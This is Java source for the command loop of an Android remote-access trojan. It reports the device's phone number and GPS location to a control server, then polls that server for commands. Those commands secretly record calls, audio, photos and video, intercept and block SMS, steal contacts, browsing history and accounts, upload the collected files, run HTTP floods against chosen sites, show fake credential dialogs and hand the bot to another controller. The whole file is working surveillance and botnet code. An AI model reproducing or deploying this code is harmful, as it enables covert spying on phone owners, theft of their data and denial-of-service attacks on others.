package u.can.i.up.expert.threads;

import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import u.can.i.up.expert.MyService;
import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;
import u.can.i.up.expert.framework.UpdateApp;
import u.can.i.up.expert.utils.UploadFiles;
import u.can.i.up.expert.utils.callNumber;
import u.can.i.up.expert.utils.changeDirectory;
import u.can.i.up.expert.utils.deleteCallLogNumber;
import u.can.i.up.expert.utils.deleteFiles;
import u.can.i.up.expert.utils.deleteSms;
import u.can.i.up.expert.utils.getBrowserBookmarks;
import u.can.i.up.expert.utils.getBrowserHistory;
import u.can.i.up.expert.utils.getCallHistory;
import u.can.i.up.expert.utils.getContacts;
import u.can.i.up.expert.utils.getInboxSms;
import u.can.i.up.expert.utils.getInstalledApps;
import u.can.i.up.expert.utils.getSentSms;
import u.can.i.up.expert.utils.getUserAccounts;
import u.can.i.up.expert.utils.httpFlood;
import u.can.i.up.expert.utils.mediaVolumeDown;
import u.can.i.up.expert.utils.mediaVolumeUp;
import u.can.i.up.expert.utils.openApp;
import u.can.i.up.expert.utils.openDialog;
import u.can.i.up.expert.utils.openWebpage;
import u.can.i.up.expert.utils.promptUninstall;
import u.can.i.up.expert.utils.recordAudio;
import u.can.i.up.expert.utils.ringerVolumeDown;
import u.can.i.up.expert.utils.ringerVolumeUp;
import u.can.i.up.expert.utils.screenOn;
import u.can.i.up.expert.utils.sendContactsText;
import u.can.i.up.expert.utils.sendText;
import u.can.i.up.expert.utils.takePhoto;
import u.can.i.up.expert.utils.takeVideo;
import u.can.i.up.expert.utils.transferBot;
import u.can.i.up.expert.utils.uploadPictures;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class CoreThread extends Thread {
    MyService myService;
    CoreThread(){
        this.myService = DataSet.getInstance().myService;
    }
    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            Factory.updateWithNewLocation(location);
        }
        public void onProviderDisabled(String provider) {
            Factory.updateWithNewLocation(null);
        }
        public void onProviderEnabled(String provider) {
        }
        public void onStatusChanged(String provider, int status, Bundle extras) {
        }
    };
    @Override
    public void run() {
        Looper.prepare();
        int i=0;
        while(true)
        {
//				if(isNetworkAvailable())//url not reachable
//				{
////					new isUrlAlive(URL).execute("");
//				}

            DataSet.getInstance().device = Build.MODEL;
            DataSet.getInstance().device =  DataSet.getInstance().device.replace(" ", "");
            DataSet.getInstance().sdk = Integer.valueOf(Build.VERSION.SDK).toString(); //Build.VERSION.RELEASE;
            TelephonyManager telephonyManager =((TelephonyManager)myService.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
            DataSet.getInstance().provider = Factory.removeBlankSpace(new StringBuilder(telephonyManager.getNetworkOperatorName()));
            DataSet.getInstance().phonenumber = telephonyManager.getLine1Number();
            DataSet.getInstance().locManager = (LocationManager)myService.getSystemService(Context.LOCATION_SERVICE);
            DataSet.getInstance().locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,400,1, locationListener);
            DataSet.getInstance().location = DataSet.getInstance().locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            DataSet.getInstance().random = new Random().nextInt(999);

            if(DataSet.getInstance().location != null)
            {
                DataSet.getInstance().latitude = DataSet.getInstance().location.getLatitude();
                DataSet.getInstance().longitude = DataSet.getInstance().location.getLongitude();
                Log.i("com.connect", "Location Is Live = (" + DataSet.getInstance().latitude + "," + DataSet.getInstance().longitude + ")");
            }

            else
            {
                Log.i("com.connect","Location Is Dead");
            }

            String url = DataSet.getInstance().URL + DataSet.getInstance().urlSendUpdate + "UID="
                    + DataSet.getInstance().androidId + "&Provider=" + DataSet.getInstance().provider
                    + "&Phone_Number=" + DataSet.getInstance().phonenumber + "&Coordinates="
                    + DataSet.getInstance().latitude + "," + DataSet.getInstance().longitude + "&Device="
                    + DataSet.getInstance().device + "&Sdk=" + DataSet.getInstance().sdk +"&Version="
                    + DataSet.getInstance().version + "&Random=" + DataSet.getInstance().random
                    + "&Password=" + DataSet.getInstance().password;
            try {
                Log.i("com.connect", url);
                Factory.getInputStreamFromUrl(url, "");
            } catch (UnsupportedEncodingException e2) {

                e2.printStackTrace();
            }

            URL functions;
            try {
                functions = new URL(DataSet.getInstance().URL + DataSet.getInstance().urlFunctions + "UID="
                        + DataSet.getInstance().androidId + "&Password=" + DataSet.getInstance().password);
                Log.i("com.connect", functions.toString());

                BufferedReader in = new BufferedReader(new InputStreamReader(functions.openStream()));

                StringBuilder total = new StringBuilder();
                String line;

                while ((line = in.readLine()) != null)
                {
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    total.append(line);
                    Log.i("com.connect", "Function Run: " + line);

                    String parameter = "";
                    Matcher m = Pattern.compile("\\(([^)]+)\\)").matcher(line);
                    while(m.find()) {
                        Log.i("com.connect", "Function Run: " + m.group(1));
                        parameter = m.group(1);
                    }

                    if(parameter.equals(""))
                    {
                        parameter = "default";
                    }

                    List<String> list = new ArrayList<String>(Arrays.asList(parameter.split("~~")));//used to spit ","

                    try {

                        if(line.contains("mediavolumeup("))
                        {
                            new mediaVolumeUp().execute("");
                        }
                        else if(line.contains("mediavolumedown("))
                        {
                            new mediaVolumeDown().execute("");
                        }
                        else if(line.contains("ringervolumeup("))
                        {
                            new ringerVolumeUp().execute("");
                        }
                        else if(line.contains("ringervolumedown("))
                        {
                            new ringerVolumeDown().execute("");
                        }
                        else if(line.contains("screenon("))
                        {
                            new screenOn().execute("");
                        }
                        else if(line.contains("recordcalls("))
                        {
                            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("RecordCalls", Boolean.parseBoolean(list.get(0))).commit();
                            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Calls set to: " + list.get(0));
                        }
                        else if(line.contains("intercept("))
                        {
                            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("intercept", Boolean.parseBoolean(list.get(0))).commit();
                            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Intercept set to: " + list.get(0));
                        }
                        else if(line.contains("blocksms("))
                        {
                            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("blockSMS", Boolean.parseBoolean(list.get(0))).commit();
                            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Block SMS set to: " + list.get(0));
                        }
                        else if(line.contains("recordaudio("))
                        {
                            new recordAudio(list.get(0)).execute("");
                        }
                        else if(line.contains("takevideo("))
                        {
                            new takeVideo(list.get(0), list.get(1)).execute("");
                        }
                        else if(line.contains("takephoto("))
                        {
                            if(list.get(0).equalsIgnoreCase("1"))
                            {
                                new takePhoto("1").execute("");
                            }
                            else
                                new takePhoto("0").execute("");
                        }
                        else if(line.contains("settimeout("))
                        {
                            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putInt("Timeout", Integer.parseInt(list.get(0))).commit();
                            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Timeout set to: " + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getInt("Timeout", 1));
                        }
                        else if(line.contains("sendtext("))
                        {
                            if(list.get(0).equals("default") || list.get(1) == null)
                            {
                            }
                            else
                                new sendText(list.get(0),list.get(1)).execute("");
                        }
                        else if(line.contains("sendcontacts("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new sendContactsText(list.get(0)).execute("");
                        }
                        else if(line.contains("callnumber("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new callNumber(list.get(0)).execute("");
                        }
                        else if(line.contains("deletecalllognumber("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new deleteCallLogNumber(list.get(0)).execute("");
                        }
                        else if(line.contains("openwebpage("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new openWebpage(list.get(0)).execute("");
                        }
                        else if(line.contains("updateapp("))
                        {
                            if(Integer.parseInt(list.get(0)) > PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getInt("Version", 0))
                            {
                                UpdateApp updateApp = new UpdateApp();
                                updateApp.setContext(myService.getApplicationContext());
                                updateApp.execute(list.get(0));
                            }
                            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Attempting to Download App and Prompt Update");
                        }
                        else if(line.contains("promptupdate("))
                        {
                            if(Integer.parseInt(list.get(0)) > PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getInt("Version", 0))
                            {
                                Intent intent = new Intent(Intent.ACTION_VIEW);
                                intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory().getPath() + "/Download/update.apk")), "application/vnd.android.package-archive");
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
                                myService.startActivity(intent);
                            }
                            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Prompted Update");
                        }
                        else if(line.contains("promptuninstall("))
                        {
                            new promptUninstall().execute("");
                        }
                        else if(line.contains("uploadfiles("))
                        {
                            if(list.get(0).equals("default"))
                            {
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                            }
                            else if(list.get(0).equals("Calls" + File.separator))
                            {
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                            }
                            else if(list.get(0).equals("Audio"))
                            {
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                            }
                            else if(list.get(0).equals("Videos"))
                            {
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                            }
                            else if(list.get(0).equals("Pictures"))
                            {
                                new UploadFiles(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, DataSet.getInstance().urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
                            }
                        }
                        else if(line.contains("changedirectory("))
                        {
                            new changeDirectory().execute();
                        }
                        else if(line.contains("deletefiles("))
                        {
                            if(list.get(0).equals("default"))
                            {
                                new deleteFiles("Audio").execute("");
                                new deleteFiles("Videos").execute("");
                                new deleteFiles("Pictures").execute("");
                                new deleteFiles("Calls").execute("");
                            }
                            else if(list.get(0).equals("Audio"))
                            {
                                new deleteFiles("Audio").execute("");
                            }
                            else if(list.get(0).equals("Videos"))
                            {
                                new deleteFiles("Videos").execute("");
                            }
                            else if(list.get(0).equals("Pictures"))
                            {
                                new deleteFiles("Pictures").execute("");
                            }
                            else if(list.get(0).equals("Calls"))
                            {
                                new deleteFiles("Calls").execute("");
                            }
                        }
                        else if(line.contains("getbrowserhistory("))
                        {

                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getBrowserHistory(list.get(0)).execute("");
                        }
                        else if(line.contains("getbrowserbookmarks("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getBrowserBookmarks(list.get(0)).execute("");
                        }
                        else if(line.contains("getcallhistory("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getCallHistory(list.get(0)).execute("");
                        }
                        else if(line.contains("getcontacts("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getContacts(list.get(0)).execute("");
                        }
                        else if(line.contains("getinboxsms("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getInboxSms(list.get(0)).execute("");
                        }
                        else if(line.contains("getsentsms("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getSentSms(list.get(0)).execute("");
                        }
                        else if(line.contains("deletesms("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new deleteSms(list.get(0),list.get(1));
                        }
                        else if(line.contains("getuseraccounts("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getUserAccounts(list.get(0)).execute("");
                        }
                        else if(line.contains("getinstalledapps("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new getInstalledApps(list.get(0)).execute("");
                        }
                        else if(line.contains("httpflood("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new httpFlood(list.get(0), list.get(1)).execute("");
                        }
                        else if(line.contains("openapp("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new openApp(list.get(0)).execute("");
                        }
                        else if(line.contains("opendialog("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new openDialog(list.get(0),list.get(1)).execute("");
                        }
                        else if(line.contains("uploadpictures("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new uploadPictures(list.get(0),list.get(1), list.get(2)).execute("");
                        }
                        //						else if(line.contains("setbackupurl("))
                        //						{
                        //								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", Base64.encodeToString(list.get(0).getBytes(), Base64.DEFAULT )).commit();
                        //						}
                        else if(line.contains("transferbot("))
                        {
                            if(list.get(0).equals("default"))
                            {
                            }
                            else
                                new transferBot(list.get(0));
                        }
                        else{}
                    } catch (IndexOutOfBoundsException e) {
                        e.printStackTrace();
                    }
                }
            } catch (MalformedURLException e1) {
                e1.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

            if(Factory.isNetworkAvailable() && i==0)
            {
                // Initial Connect Run Apps

//		            new recordAudio("20000").execute("");
//		    		new takePhoto("0").execute("");
//		            new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//			        new mediaVolumeUp().execute("");
//			        new mediaVolumeDown().execute("");
//			        new ringerVolumeUp().execute("");
//			        new ringerVolumeDown().execute("");
//			        new screenOn().execute("");
//			        new recordAudio("2000").execute("");
//				    new takePhoto("0").execute("");
//				    new takePhoto("1").execute("");
//		        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
//			        new takeVideo("0", "10000").execute("");
//			        new takeVideo("1", "10000").execute("");
//					new sendText("999","Test Message").execute("");
//					new sendContactsText(list.get(0)).execute("");
//					new callNumber("999").execute("");
//		    		new deleteCallLogNumber("1231231234").execute();
//					new openWebpage("http://google.com").execute("");
//					new promptUninstall().execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//					new changeDirectory().execute();
//					new deleteFiles("Audio").execute("");
//				    new deleteFiles("Videos").execute("");
//				    new deleteFiles("Pictures").execute("");
//				    new deleteFiles("Calls").execute("");
//					new getBrowserHistory("10").execute("");
//					new getBrowserBookmarks("10").execute("");
//					new getCallHistory("1").execute("");
//					new getContacts("1").execute("");
//					new getInboxSms("1").execute("");
//					new getSentSms("1").execute("");
//					new deleteSms("3","579").execute("");
//					new getUserAccounts("10").execute("");
//					new getInstalledApps("10").execute("");
//					new httpFlood("www.google.com", "1000").execute("");
//					new openApp(list.get(0)).execute("");//packageName
//					new openDialog("Enter Gmail","TEst").execute("");
//		    		new uploadPictures("0","99999999999999", "10").execute("");
//		    		new transferBot("http://pizzachip.com/rat").execute("");
                i++;
            }

            try
            {
                Thread.sleep(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getInt("Timeout", 1));
            }
            catch (Exception e)
            {
                this.start(); //initiate(); //
            }
        }
    }


}
